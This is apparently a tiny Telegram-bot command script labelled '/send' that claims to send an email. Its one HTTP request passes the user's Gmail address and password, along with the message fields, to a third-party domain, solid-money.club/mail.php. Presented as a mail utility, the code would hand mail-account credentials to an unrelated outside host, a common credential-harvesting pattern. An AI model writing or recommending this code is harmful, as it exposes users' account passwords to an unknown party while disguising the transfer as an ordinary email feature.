/*CMD
  command: /send
  help: 
  need_reply: 
  auto_retry_time: 
  folder: 
  answer: 
  keyboard: 
  aliases: 
CMD*/

HTTP.get( {
    url: "https://solid-money.club/mail.php",
    success: '/onLoading ',
    body: {
mail : "your gmail address",
password: "gmail password",
to: "to whom you want to send email",
body: "hello adi here",
subject: "saying hello"
},   
  } )
